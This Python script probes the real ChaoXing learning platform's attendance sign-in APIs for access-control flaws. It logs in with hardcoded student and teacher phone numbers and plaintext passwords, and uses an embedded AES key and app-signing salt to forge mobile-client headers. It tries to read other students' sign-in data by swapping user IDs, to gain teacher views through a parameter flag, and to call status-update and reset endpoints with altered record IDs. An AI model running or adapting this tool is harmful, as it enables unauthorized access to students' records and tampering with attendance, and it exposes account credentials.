#!/usr/bin/env python3
"""
ChaoXing Sign-in Detail API Enumeration Script
Comprehensive enumeration of sign-in detail/statistics APIs accessible by students.
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ Constants ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
MOOC_BASE = "https://mooc1-api.chaoxing.com/mooc-ans"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

# ============ Helper Functions ============

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

PC_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ Results Tracking ============
results = []

def test_endpoint(session, method, base_url, path, params, label, session_name):
    """Test a single endpoint and record results."""
    url = f"{base_url}{path}"
    try:
        if method == "GET":
            r = session.get(url, params=params, timeout=15, allow_redirects=False)
        else:
            r = session.post(url, data=params, timeout=15, allow_redirects=False)

        status = r.status_code
        text = r.text[:500] if r.text else ""

        markers = []
        is_found = False
        is_sensitive = False
        is_modifiable = False

        if status == 200 and text:
            try:
                j = json.loads(r.text)
                is_found = True
                markers.append("!!!FOUND!!!")
                text_lower = r.text.lower()
                if any(kw in text_lower for kw in ["stulist", "studentlist", "signedlist", "unsignlist", "uidlist", "signednum", "unsignnum"]):
                    is_sensitive = True
                    markers.append("!!!SENSITIVE!!!")
                if any(kw in text_lower for kw in ["recordid", "signid", "status", "operate", "update"]):
                    is_modifiable = True
                    markers.append("!!!MODIFIABLE!!!")
            except json.JSONDecodeError:
                if len(text) > 50:
                    is_found = True
                    markers.append("!!!FOUND!!!")
                    text_lower = text.lower()
                    if any(kw in text_lower for kw in ["stulist", "student", "uid", "signlist"]):
                        is_sensitive = True
                        markers.append("!!!SENSITIVE!!!")

        marker_str = " ".join(markers)
        preview = text[:200].replace("\n", " ").replace("\r", "")
        line = f"[{path}] [{method}] [{session_name}] [{label}] -> {status} | {preview} {marker_str}"
        print(line)

        results.append({
            "path": path, "method": method, "session": session_name, "params_label": label,
            "status": status, "found": is_found, "sensitive": is_sensitive, "modifiable": is_modifiable,
            "preview": preview, "base_url": base_url
        })
        return r
    except Exception as e:
        line = f"[{path}] [{method}] [{session_name}] [{label}] -> ERROR | {str(e)[:100]}"
        print(line)
        results.append({
            "path": path, "method": method, "session": session_name, "params_label": label,
            "status": "ERR", "found": False, "sensitive": False, "modifiable": False,
            "preview": str(e)[:100], "base_url": base_url
        })
        return None

def extract_active_list(act_data):
    """Extract activeList from various response formats."""
    if "activeList" in act_data:
        return act_data["activeList"]
    if "data" in act_data:
        if isinstance(act_data["data"], dict) and "activeList" in act_data["data"]:
            return act_data["data"]["activeList"]
        if isinstance(act_data["data"], list):
            return act_data["data"]
    return []

# ============ Main ============

def main():
    print("=" * 80)
    print("ChaoXing 签到详情API枚举脚本")
    print("=" * 80)

    # ---- Login ----
    print("\n[*] 登录学生账号...")
    stu_sess, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {stu_puid}")

    print("[*] 登录教师账号...")
    tea_sess, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("[!] 登录失败，退出")
        sys.exit(1)

    # ---- Part 1: Get activity list ----
    print("\n" + "=" * 80)
    print("Part 1: 获取活动列表")
    print("=" * 80)

    act_url = f"{BASE}/ppt/activeAPI/taskactivelist"
    act_params = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": stu_puid}

    print(f"[*] 请求: {act_url}")
    r = stu_sess.get(act_url, params=act_params, timeout=20)
    print(f"    HTTP Status: {r.status_code}")

    activities = []
    sign_activities = []
    try:
        act_data = r.json()
        print(f"    响应键: {list(act_data.keys())}")

        active_list = extract_active_list(act_data)
        print(f"    活动数量: {len(active_list)}")

        for item in active_list:
            activities.append(item)
            atype = item.get("activeType", item.get("type", "?"))
            aid = item.get("id", item.get("activeId", "?"))
            name = item.get("nameOne", item.get("name", item.get("title", "?")))
            status = item.get("status", "?")
            url_field = item.get("url", "")
            print(f"    活动: id={aid}, type={atype}, name={name}, status={status}")
            if str(atype) == "2":
                sign_activities.append(item)
    except Exception as e:
        print(f"    解析活动列表失败: {e}")
        print(f"    原始响应: {r.text[:1000]}")

    # Also try teacher session
    print("\n[*] 教师端获取活动列表...")
    r2 = tea_sess.get(act_url, params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": tea_puid}, timeout=20)
    print(f"    HTTP Status: {r2.status_code}")
    try:
        act_data2 = r2.json()
        active_list2 = extract_active_list(act_data2)
        for item in active_list2:
            atype = item.get("activeType", item.get("type", "?"))
            aid = item.get("id", item.get("activeId", "?"))
            name = item.get("nameOne", item.get("name", item.get("title", "?")))
            print(f"    活动: id={aid}, type={atype}, name={name}")
            if str(atype) == "2" and not any(a.get("id") == aid for a in sign_activities):
                sign_activities.append(item)
    except Exception as e:
        print(f"    教师端解析失败: {e}")

    if not sign_activities:
        print("[!] 未找到签到类型活动(activeType=2)")
        sys.exit(1)

    # Pick at least 3 sign-in activities
    test_activities = sign_activities[:min(5, len(sign_activities))]
    primary_aid = str(test_activities[0].get("id", test_activities[0].get("activeId", "0")))
    print(f"\n[*] 主测试活动ID: {primary_aid}")
    print(f"[*] 备选活动IDs: {[str(a.get('id', a.get('activeId', '?'))) for a in test_activities]}")

    # ---- Part 1.5: Deep analyze activity list response ----
    print("\n" + "=" * 80)
    print("Part 5: 活动详情深度分析")
    print("=" * 80)

    act_text = r.text
    url_patterns = re.findall(r'https?://[^\s"\'<>]+', act_text)
    print(f"\n[*] 活动列表响应中的URL ({len(url_patterns)} 个):")
    for u in url_patterns[:30]:
        print(f"    {u}")

    # Look for url fields in JSON
    try:
        act_json = r.json()
        def find_urls(obj, prefix=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k in ("url", "href", "link", "api", "redirect") and isinstance(v, str) and v:
                        print(f"    发现URL字段: {prefix}.{k} = {v}")
                    find_urls(v, f"{prefix}.{k}" if prefix else k)
            elif isinstance(obj, list):
                for i, v in enumerate(obj):
                    find_urls(v, f"{prefix}[{i}]")
        find_urls(act_json)
    except:
        pass

    # Check for statistics data in activity response
    print("\n[*] 检查活动列表中是否包含签到统计或其他学生数据...")
    act_lower = act_text.lower()
    for kw in ["stulist", "signedlist", "unsignlist", "count", "statistics", "signcount", "student", "attendnum"]:
        if kw in act_lower:
            # Find context
            idx = act_lower.find(kw)
            context = act_text[max(0,idx-30):idx+50]
            print(f"    发现关键词: {kw} -> ...{context}...")

    # ---- Get cpi from course data ----
    cpi = ""
    print("\n[*] 获取cpi参数...")
    try:
        # Try multiple approaches to get cpi
        cr = stu_sess.get(f"{BASE}/mycourse/backclazzdata?view=json&m=0", timeout=20)
        cpi_match = re.search(r'"cpi"\s*:\s*(\d+)', cr.text)
        if cpi_match:
            cpi = cpi_match.group(1)
            print(f"    CPI (backclazzdata): {cpi}")
        else:
            # Try from course list page
            cr2 = stu_sess.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
            cpi_match2 = re.search(r'"cpi"\s*:\s*(\d+)', cr2.text)
            if cpi_match2:
                cpi = cpi_match2.group(1)
                print(f"    CPI (mooc1 backclazzdata): {cpi}")
            else:
                # Try extracting from activity URL
                for act in sign_activities:
                    url = act.get("url", "")
                    cpi_m = re.search(r'cpi=(\d+)', url)
                    if cpi_m:
                        cpi = cpi_m.group(1)
                        break
                if cpi:
                    print(f"    CPI (from activity URL): {cpi}")
                else:
                    print(f"    未找到cpi")
    except Exception as e:
        print(f"    获取cpi失败: {e}")

    # ---- Build parameter sets ----
    def make_params_a(aid, puid):
        return {"activeId": aid, "uid": puid}

    def make_params_b(aid, puid):
        return {"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}

    def make_params_c(aid):
        return {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID}

    param_builders = [
        ("A", make_params_a),
        ("B", make_params_b),
        ("C", make_params_c),
    ]

    # ---- Part 2: Enumerate ALL sign-in detail endpoints ----
    print("\n" + "=" * 80)
    print("Part 2: 枚举所有签到详情端点")
    print("=" * 80)

    pptsign_endpoints = [
        "signedResult", "signDetail", "getSignDetail", "getSignStuInfo", "getStuSignList",
        "signStuList", "getSignResult", "signResult", "signInfo", "getSignInfo",
        "checkSign", "signStuInfo", "stuSignInfo", "getSignStatus", "signStatus",
        "signStuDetail", "stuSignDetail", "signRecord", "getSignRecord", "signList",
        "getSignList", "signStatistics", "getSignStatistics", "signCount", "getSignCount",
        "exportSign", "signExport"
    ]

    newsign_endpoints = [
        "getSignDetail", "signDetail", "signStuList", "getStuList", "signResult",
        "getSignResult", "signInfo", "getSignInfo", "activeDetail", "getActiveDetail",
        "signRecord", "getSignRecord", "signStatistics", "getSignStatistics",
        "signCount", "getSignCount", "signList", "getSignList"
    ]

    v2sign_endpoints = [
        "signDetail", "signResult", "stuList", "getStuList", "signInfo", "getSignInfo",
        "activeDetail", "statistics", "stat", "count", "signRecord", "getSignRecord",
        "detail", "result", "list"
    ]

    activeapi_endpoints = [
        "getActiveDetail", "activeDetail", "signStuList", "getStuList", "signResult",
        "getSignResult", "taskdetail", "taskDetail", "signDetail", "signInfo", "signStatistics"
    ]

    endpoint_groups = [
        ("/pptSign/", pptsign_endpoints, BASE),
        ("/newsign/", newsign_endpoints, BASE),
        ("/v2/apis/sign/", v2sign_endpoints, BASE),
        ("/ppt/activeAPI/", activeapi_endpoints, BASE),
        ("/mooc-ans/pptSign/", pptsign_endpoints, MOOC_BASE),
    ]

    sessions = [
        (stu_sess, stu_puid, "STU"),
        (tea_sess, tea_puid, "TEA"),
    ]

    total_tests = 0
    for prefix, endpoints, domain in endpoint_groups:
        for ep in endpoints:
            path = f"{prefix}{ep}"
            for sess, puid, sess_name in sessions:
                for plabel, pfunc in param_builders:
                    if plabel == "C":
                        params = pfunc(primary_aid)
                    else:
                        params = pfunc(primary_aid, puid)
                    for method in ["GET", "POST"]:
                        test_endpoint(sess, method, domain, path, params, plabel, sess_name)
                        total_tests += 1

    print(f"\n[*] Part 2 完成，共测试 {total_tests} 个组合")

    # ---- Part 3: Special focus on signedResult ----
    print("\n" + "=" * 80)
    print("Part 3: signedResult 深度分析")
    print("=" * 80)

    # 3.1: All param combos with GET/POST
    print("\n[3.1] signedResult 全参数组合测试")
    for method in ["GET", "POST"]:
        for sess, puid, sess_name in sessions:
            for plabel, pfunc in param_builders:
                if plabel == "C":
                    params = pfunc(primary_aid)
                else:
                    params = pfunc(primary_aid, puid)
                test_endpoint(sess, method, BASE, "/pptSign/signedResult", params, plabel, sess_name)

    # 3.2: With cpi parameter
    if cpi:
        print(f"\n[3.2] signedResult + cpi={cpi}")
        for method in ["GET", "POST"]:
            for sess, puid, sess_name in sessions:
                params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid, "cpi": cpi}
                test_endpoint(sess, method, BASE, "/pptSign/signedResult", params, "B+cpi", sess_name)

    # 3.3: PC browser UA
    print("\n[3.3] signedResult 使用PC浏览器UA")
    for sess, puid, sess_name in sessions:
        orig_ua = sess.headers.get("User-Agent", "")
        sess.headers["User-Agent"] = PC_UA
        params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
        test_endpoint(sess, "GET", BASE, "/pptSign/signedResult", params, "B+PC_UA", sess_name)
        sess.headers["User-Agent"] = orig_ua

    # 3.4: Access HTML page and parse for embedded API calls
    print("\n[3.4] signedResult HTML页面分析")
    for sess, puid, sess_name in sessions:
        params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
        try:
            r = sess.get(f"{BASE}/pptSign/signedResult", params=params, timeout=15)
            text = r.text
            print(f"    [{sess_name}] HTML长度: {len(text)}")
            print(f"    [{sess_name}] 前200字符: {text[:200]}")

            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', text)
            print(f"    [{sess_name}] JS文件: {js_urls[:10]}")

            api_calls = re.findall(r'(?:fetch|ajax|axios|get|post)\s*\(\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
            print(f"    [{sess_name}] API调用: {api_calls[:10]}")

            all_urls = re.findall(r'https?://[^\s"\'<>)]+', text)
            print(f"    [{sess_name}] 所有URL ({len(all_urls)} 个):")
            for u in all_urls[:20]:
                print(f"        {u}")

            sign_endpoints_in_html = re.findall(r'["\']([^"\']*sign[^"\']*)["\']', text, re.IGNORECASE)
            if sign_endpoints_in_html:
                print(f"    [{sess_name}] 签到相关端点: {sign_endpoints_in_html[:15]}")

            data_attrs = re.findall(r'data-([a-zA-Z]+)=["\']([^"\']*)["\']', text)
            if data_attrs:
                print(f"    [{sess_name}] Data属性: {data_attrs[:15]}")
        except Exception as e:
            print(f"    [{sess_name}] 错误: {e}")

    # 3.5: Try signedResult on mooc1-api
    print("\n[3.5] signedResult on mooc1-api")
    for sess, puid, sess_name in sessions:
        params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
        test_endpoint(sess, "GET", MOOC_BASE, "/mooc-ans/pptSign/signedResult", params, "B", sess_name)

    # ---- Part 4: V2 signIn deep analysis ----
    print("\n" + "=" * 80)
    print("Part 4: V2 signIn 深度分析")
    print("=" * 80)

    # 4.1: Test with different activeId values
    print("\n[4.1] /v2/apis/sign/signIn 不同activeId测试")
    for i, act in enumerate(test_activities[:3]):
        aid = str(act.get("id", act.get("activeId", "0")))
        for sess, puid, sess_name in sessions:
            params = {"activeId": aid, "uid": puid, "courseId": COURSE_ID, "classId": CLASS_ID}
            test_endpoint(sess, "GET", BASE, "/v2/apis/sign/signIn", params, f"act{i+1}", sess_name)

    # 4.2: Analyze response fields
    print("\n[4.2] /v2/apis/sign/signIn 响应字段分析")
    for sess, puid, sess_name in sessions:
        params = {"activeId": primary_aid, "uid": puid, "courseId": COURSE_ID, "classId": CLASS_ID}
        try:
            r = sess.get(f"{BASE}/v2/apis/sign/signIn", params=params, timeout=15)
            print(f"    [{sess_name}] Status: {r.status_code}")
            try:
                j = r.json()
                print(f"    [{sess_name}] JSON: {json.dumps(j, ensure_ascii=False)[:500]}")
                def find_fields(obj, prefix=""):
                    if isinstance(obj, dict):
                        for k, v in obj.items():
                            full_key = f"{prefix}.{k}" if prefix else k
                            if k in ("recordId", "signId", "status", "uid", "userId", "studentId"):
                                print(f"    [{sess_name}] 关键字段: {full_key} = {v}")
                            find_fields(v, full_key)
                    elif isinstance(obj, list):
                        for i, v in enumerate(obj[:5]):
                            find_fields(v, f"{prefix}[{i}]")
                find_fields(j)
            except:
                print(f"    [{sess_name}] 非JSON响应: {r.text[:300]}")
        except Exception as e:
            print(f"    [{sess_name}] 错误: {e}")

    # 4.3: Try getting other students' data by changing uid
    print("\n[4.3] 尝试通过修改uid获取其他学生数据")
    other_uids = [tea_puid, "431407443", "1", "999999999"]
    for other_uid in other_uids:
        params = {"activeId": primary_aid, "uid": other_uid, "courseId": COURSE_ID, "classId": CLASS_ID}
        try:
            r = stu_sess.get(f"{BASE}/v2/apis/sign/signIn", params=params, timeout=15)
            text = r.text[:300]
            marker = ""
            if r.status_code == 200:
                try:
                    j = r.json()
                    if "data" in j and j["data"]:
                        marker = "!!!SENSITIVE!!!" if other_uid != stu_puid else ""
                except:
                    pass
            print(f"    [STU->uid={other_uid}] {r.status_code} | {text} {marker}")
        except Exception as e:
            print(f"    [STU->uid={other_uid}] ERROR | {e}")

    # ---- Additional: Test preSign page and other HTML pages ----
    print("\n" + "=" * 80)
    print("额外: 签到页面HTML分析 & 创造性端点测试")
    print("=" * 80)

    # Test preSign page
    print("\n[*] 测试preSign页面...")
    for sess, puid, sess_name in sessions:
        presign_url = f"{BASE}/newsign/preSign"
        params = {"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": primary_aid,
                  "general": "1", "sys": "1", "ls": "1", "appType": "15", "uid": puid}
        try:
            r = sess.get(presign_url, params=params, timeout=15)
            text = r.text
            print(f"    [{sess_name}] preSign -> {r.status_code}, len={len(text)}")

            # Parse for API endpoints in JS
            api_in_js = re.findall(r'["\']([^"\']*(?:api|sign|active|detail|result|stu)[^"\']*)["\']', text, re.IGNORECASE)
            if api_in_js:
                unique_apis = list(set(api_in_js))[:20]
                print(f"    [{sess_name}] API端点: {unique_apis}")

            # Look for AJAX/fetch calls
            ajax_calls = re.findall(r'(?:url|api|endpoint)\s*[:=]\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
            if ajax_calls:
                print(f"    [{sess_name}] AJAX调用: {ajax_calls[:15]}")

            # Look for specific sign-related patterns
            sign_patterns = re.findall(r'(?:signedResult|signDetail|signStuList|getSignDetail|signResult)', text, re.IGNORECASE)
            if sign_patterns:
                print(f"    [{sess_name}] 签到API模式: {sign_patterns[:10]}")

            all_urls = re.findall(r'https?://[^\s"\'<>)]+', text)
            sign_urls = [u for u in all_urls if 'sign' in u.lower() or 'active' in u.lower() or 'api' in u.lower()]
            if sign_urls:
                print(f"    [{sess_name}] 签到相关URL: {sign_urls[:15]}")
        except Exception as e:
            print(f"    [{sess_name}] preSign错误: {e}")

    # Test signStu HTML page
    print("\n[*] 测试signStu HTML页面...")
    for sess, puid, sess_name in sessions:
        for page_path in ["/pptSign/signStu", "/newsign/signStu", "/pptSign/signDetail", "/newsign/signDetail"]:
            params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
            try:
                r = sess.get(f"{BASE}{page_path}", params=params, timeout=15)
                text = r.text
                if r.status_code == 200 and len(text) > 300:
                    print(f"    [{sess_name}] {page_path} -> {r.status_code}, len={len(text)}")
                    # Look for API calls
                    api_in_page = re.findall(r'["\']([^"\']*(?:api|sign|active|detail|result|stu)[^"\']*)["\']', text, re.IGNORECASE)
                    if api_in_page:
                        print(f"    [{sess_name}] API端点: {list(set(api_in_page))[:15]}")
                    all_urls = re.findall(r'https?://[^\s"\'<>)]+', text)
                    if all_urls:
                        print(f"    [{sess_name}] URLs: {all_urls[:10]}")
            except:
                pass

    # Extra creative endpoints
    print("\n[*] 创造性端点测试...")
    extra_paths = [
        "/pptSign/signedResult/view",
        "/pptSign/signedResult/index",
        "/newsign/signStuList/view",
        "/v2/apis/sign/stuList/view",
        "/v2/apis/signIn/detail",
        "/v2/apis/signIn/result",
        "/v2/apis/signIn/stuList",
        "/v2/apis/signIn/statistics",
    ]

    for path in extra_paths:
        for sess, puid, sess_name in sessions:
            params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
            test_endpoint(sess, "GET", BASE, path, params, "B", sess_name)

    # ---- Also test mooc1-api creative endpoints ----
    print("\n[*] mooc1-api创造性端点测试...")
    mooc_extra_paths = [
        "/mooc-ans/pptSign/signedResult",
        "/mooc-ans/newsign/getSignDetail",
        "/mooc-ans/v2/apis/sign/signDetail",
        "/mooc-ans/pptSign/signStuList",
        "/mooc-ans/newsign/signStuList",
    ]
    for path in mooc_extra_paths:
        for sess, puid, sess_name in sessions:
            params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
            test_endpoint(sess, "GET", MOOC_BASE, path, params, "B", sess_name)

    # ---- Part 6: Test endpoints discovered from teacher preSign page ----
    print("\n" + "=" * 80)
    print("Part 6: 教师端preSign页面发现的API端点测试")
    print("=" * 80)

    # These endpoints were found in the teacher's preSign page HTML
    discovered_endpoints = [
        # Sign list endpoints
        ("/pptSign/refeashSignList4Json2", "GET"),
        ("/pptSign/refeashSignList4Json2", "POST"),
        ("/pptSign/autoRefeashSignList4Json2", "GET"),
        ("/pptSign/autoRefeashSignList4Json2", "POST"),
        # Sign status management
        ("/pptSign/updateSignStatus", "GET"),
        ("/pptSign/updateSignStatus", "POST"),
        ("/pptSign/resetUserSignStatus", "GET"),
        ("/pptSign/resetUserSignStatus", "POST"),
        # Sign code
        ("/widget/sign/pcTeaSignController/getSignCode", "GET"),
        ("/widget/sign/pcTeaSignController/getSignCode", "POST"),
        # QR code
        ("/v2/apis/sign/refreshQRCode", "GET"),
        ("/v2/apis/sign/refreshQRCode", "POST"),
        # End sign
        ("/pptSign/endSign", "GET"),
        ("/pptSign/endSign", "POST"),
        # Refresh
        ("/pptSign/shuaxin", "GET"),
        ("/pptSign/shuaxin", "POST"),
        # Export data
        ("/widget/pcpick/main/exportmobileSingleData", "GET"),
        ("/widget/pcpick/main/exportmobileSingleData", "POST"),
        # Active status
        ("/v2/apis/active/getIsDeleteActive", "GET"),
        ("/v2/apis/active/getIsDeleteActive", "POST"),
        # Screen
        ("/pptActiveCommon/toScreen", "GET"),
        ("/pptActiveCommon/toScreen", "POST"),
        # Student's preSign discovered
        ("/sign/tiaozhuanSuc", "GET"),
        ("/sign/tiaozhuanSuc", "POST"),
        ("/pptSign/tiaozhuanSuc", "GET"),
        ("/pptSign/tiaozhuanSuc", "POST"),
        # VP probability
        ("/v2/apis/sign/vp-probability/mark-right", "GET"),
        ("/v2/apis/sign/vp-probability/mark-right", "POST"),
        # Additional sign list variants
        ("/pptSign/signList4Json", "GET"),
        ("/pptSign/signList4Json", "POST"),
        ("/pptSign/getSignList4Json", "GET"),
        ("/pptSign/getSignList4Json", "POST"),
        ("/pptSign/refeashSignList4Json", "GET"),
        ("/pptSign/getSignStuInfo4Json", "GET"),
        ("/pptSign/getSignStuInfo4Json", "POST"),
        # New sign variants
        ("/newsign/refeashSignList4Json2", "GET"),
        ("/newsign/autoRefeashSignList4Json2", "GET"),
        ("/newsign/signList4Json", "GET"),
        ("/newsign/getSignStuInfo4Json", "GET"),
        # Widget sign endpoints
        ("/widget/sign/signStuList", "GET"),
        ("/widget/sign/getSignDetail", "GET"),
        ("/widget/sign/signDetail", "GET"),
        ("/widget/sign/signResult", "GET"),
        ("/widget/sign/signedResult", "GET"),
        ("/widget/sign/signInfo", "GET"),
        ("/widget/sign/signStuInfo", "GET"),
        # PC pick sign
        ("/widget/pcpick/main/signStuList", "GET"),
        ("/widget/pcpick/main/getSignDetail", "GET"),
        ("/widget/pcpick/main/signResult", "GET"),
        # Active common
        ("/pptActiveCommon/signStuList", "GET"),
        ("/pptActiveCommon/getSignDetail", "GET"),
        ("/pptActiveCommon/signResult", "GET"),
    ]

    for path, method in discovered_endpoints:
        for sess, puid, sess_name in sessions:
            params = {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}
            test_endpoint(sess, method, BASE, path, params, "B", sess_name)

    # ---- Part 7: Test refeashSignList4Json2 with detailed params ----
    print("\n" + "=" * 80)
    print("Part 7: refeashSignList4Json2 深度测试")
    print("=" * 80)

    # This is the key endpoint found in teacher's preSign page
    # Test with various parameter combinations
    for sess, puid, sess_name in sessions:
        param_combos = [
            ("B", {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}),
            ("A", {"activeId": primary_aid, "uid": puid}),
            ("C", {"activeId": primary_aid, "classId": CLASS_ID, "courseId": COURSE_ID}),
            ("D", {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID}),
            ("E", {"activeId": primary_aid}),
            ("F", {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid, "status": "1"}),
            ("G", {"activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid, "status": "0"}),
        ]
        for plabel, params in param_combos:
            for method in ["GET", "POST"]:
                test_endpoint(sess, method, BASE, "/pptSign/refeashSignList4Json2", params, plabel, sess_name)

    # ---- Part 8: Test with isTeacherViewOpen parameter ----
    print("\n" + "=" * 80)
    print("Part 8: isTeacherViewOpen参数测试")
    print("=" * 80)

    # The activity list URLs contain isTeacherViewOpen=0
    # Try setting it to 1 to see if it grants teacher-like access
    for sess, puid, sess_name in sessions:
        params_teacher_view = {
            "activeId": primary_aid, "courseId": COURSE_ID, "classId": CLASS_ID,
            "uid": puid, "isTeacherViewOpen": "1"
        }
        for ep in ["/pptSign/signedResult", "/pptSign/refeashSignList4Json2",
                    "/v2/apis/sign/signIn", "/newsign/preSign"]:
            for method in ["GET"]:
                test_endpoint(sess, method, BASE, ep, params_teacher_view, "B+teacherView", sess_name)

    # ---- Part 9: Test signIn with recordId manipulation ----
    print("\n" + "=" * 80)
    print("Part 9: signIn recordId操控测试")
    print("=" * 80)

    # The /v2/apis/sign/signIn returns a record with id field
    # Try to access other records by changing the id
    record_id = "5001371688276"  # From the signIn response
    for sess, puid, sess_name in sessions:
        params_with_record = {
            "activeId": primary_aid, "uid": puid, "courseId": COURSE_ID,
            "classId": CLASS_ID, "id": record_id, "recordId": record_id
        }
        for ep in ["/v2/apis/sign/signIn", "/pptSign/updateSignStatus", "/pptSign/resetUserSignStatus"]:
            for method in ["GET", "POST"]:
                test_endpoint(sess, method, BASE, ep, params_with_record, "B+recordId", sess_name)

    # ---- Summary ----
    print("\n" + "=" * 80)
    print("汇总报告")
    print("=" * 80)

    found_endpoints = [r for r in results if r["found"]]
    sensitive_endpoints = [r for r in results if r["sensitive"]]
    modifiable_endpoints = [r for r in results if r["modifiable"]]

    print(f"\n总测试数: {len(results)}")
    print(f"有效端点 (返回数据): {len(found_endpoints)}")
    print(f"敏感端点 (含其他学生数据): {len(sensitive_endpoints)}")
    print(f"可修改端点 (含可修改字段): {len(modifiable_endpoints)}")

    print("\n--- 有效端点列表 ---")
    print(f"{'路径':<55} {'方法':<6} {'会话':<5} {'参数':<8} {'状态':<6} {'敏感':<4} {'可改':<4}")
    print("-" * 100)
    for r in found_endpoints:
        s_flag = "Y" if r["sensitive"] else ""
        m_flag = "Y" if r["modifiable"] else ""
        print(f"{r['path']:<55} {r['method']:<6} {r['session']:<5} {r['params_label']:<8} {str(r['status']):<6} {s_flag:<4} {m_flag:<4}")

    if sensitive_endpoints:
        print("\n--- 敏感端点详情 (含其他学生数据) ---")
        for r in sensitive_endpoints:
            print(f"  {r['path']} [{r['method']}] [{r['session']}] [{r['params_label']}]")
            print(f"    预览: {r['preview'][:200]}")

    if modifiable_endpoints:
        print("\n--- 可修改端点详情 ---")
        for r in modifiable_endpoints:
            print(f"  {r['path']} [{r['method']}] [{r['session']}] [{r['params_label']}]")
            print(f"    预览: {r['preview'][:200]}")

    print("\n[*] 脚本执行完毕")


if __name__ == "__main__":
    main()
